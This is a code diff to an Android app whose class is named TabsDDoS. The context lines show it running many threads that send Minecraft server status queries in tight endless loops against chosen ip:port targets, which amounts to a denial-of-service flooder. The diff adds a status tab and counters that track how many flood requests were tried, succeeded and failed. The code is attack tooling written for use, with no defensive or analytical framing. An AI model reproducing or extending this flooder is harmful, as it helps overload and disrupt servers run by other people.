@@ -14,6 +14,7 @@ import java.security.*;
 import java.net.*;
 import android.support.v4.app.*;
 import java.lang.ref.*;
+import java.math.*;
 
 public class MainActivity extends Activity
 {
@@ -46,16 +47,20 @@ public class MainActivity extends Activity
 	public static class TabsDDoS extends FragmentActivity {
 		static WeakReference<TabsDDoS> instance=new WeakReference(null);
 		
+		volatile BigInteger triedN,successN,failedN;
+		
 		List<Thread> t=new ArrayList<>();
 		ListView players,sortedPlayers,data;
 		FragmentTabHost fth;
-		TabHost.TabSpec playersF,dataF,sortedPlayersF;
+		TabHost.TabSpec playersF,dataF,sortedPlayersF,statusF;
+		TextView tried,success,failed;
 		
 		ArrayAdapter<String> adap,adap3;
 		ArrayAdapter<Map.Entry<String,String>> adap2;
 		@Override
 		protected void onCreate(Bundle savedInstanceState) {
 			// TODO: Implement this method
+			triedN=successN=failedN=BigInteger.ZERO;
 			super.onCreate(savedInstanceState);
 			instance=new WeakReference(this);
 			
@@ -75,6 +80,10 @@ public class MainActivity extends Activity
 			dataF.setIndicator(getResources().getString(R.string.data));
 			fth.addTab(dataF,DataFragment.class,null);
 			
+			statusF=fth.newTabSpec("statusScreen");
+			statusF.setIndicator(getResources().getString(R.string.status));
+			fth.addTab(statusF,StatusFragment.class,null);
+
 			adap=new ArrayAdapter<String>(this,android.R.layout.simple_list_item_1,new ArrayList<String>());
 			adap2=new ArrayAdapter<Map.Entry<String,String>>(this,0,new ArrayList<Map.Entry<String,String>>()){
 								public View getView(int pos,View v,ViewGroup ignore){
@@ -99,11 +108,14 @@ public class MainActivity extends Activity
 							Log.d("data", ip + ":" + port);
 							MCQuery q=new MCQuery(ip, port);
 							while (!Thread.interrupted()) {
+								triedN=triedN.add(BigInteger.ONE);
 								try {
 									QueryResponseUniverse resp=q.fullStatUni();
 									update(resp);
+									successN=successN.add(BigInteger.ONE);
 								} catch (Throwable e) {
 									e.printStackTrace();
+									failedN=failedN.add(BigInteger.ONE);
 								}
 							}
 							q.finalize();
@@ -111,6 +123,26 @@ public class MainActivity extends Activity
 					});
 				t.get(t.size()-1).start();
 			}
+			Thread status;
+			(status=new Thread(){
+				public void run(){
+					while(!isInterrupted()){
+						try {
+							sleep(50);
+						} catch (InterruptedException e) {
+							return;
+						}
+						runOnUiThread(new Runnable(){
+							public void run(){
+								if(tried!=null)tried.setText(triedN+"");
+								if(success!=null)success.setText(successN+"");
+								if(failed!=null)failed.setText(failedN+"");
+							}
+						});
+					}
+				}
+			}).start();
+			t.add(status);
 		}
 		public synchronized void update(final QueryResponseUniverse resp){
 			runOnUiThread(new Runnable(){
@@ -136,6 +168,9 @@ public class MainActivity extends Activity
 		static void setSortedPlayersView(ListView lv){
 			instance.get().setSortedPlayersView_(lv);
 		}
+		static void setStatusRoot(View v){
+			instance.get().setStatusRoot_(v);
+		}
 		
 		void setPlayersView_(ListView lv){
 			players=lv;
@@ -148,6 +183,11 @@ public class MainActivity extends Activity
 		void setSortedPlayersView_(ListView lv){
 			sortedPlayers=lv;
 			lv.setAdapter(adap3);
+		}
+		void setStatusRoot_(View v){
+			tried=(TextView)v.findViewById(R.id.tried);
+			success=(TextView)v.findViewById(R.id.success);
+			failed=(TextView)v.findViewById(R.id.failed);
 		}
 		
 		@Override
@@ -181,6 +221,15 @@ public class MainActivity extends Activity
 				// TODO: Implement this method
 				ListView lv=(ListView) inflater.inflate(R.layout.ddos_data_tab,null,false);
 				setDataView(lv);
+				return lv;
+			}
+		}
+		public static class StatusFragment extends android.support.v4.app.Fragment {
+			@Override
+			public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
+				// TODO: Implement this method
+				View lv=inflater.inflate(R.layout.status,null,false);
+				setStatusRoot(lv);
 				return lv;
 			}
 		}
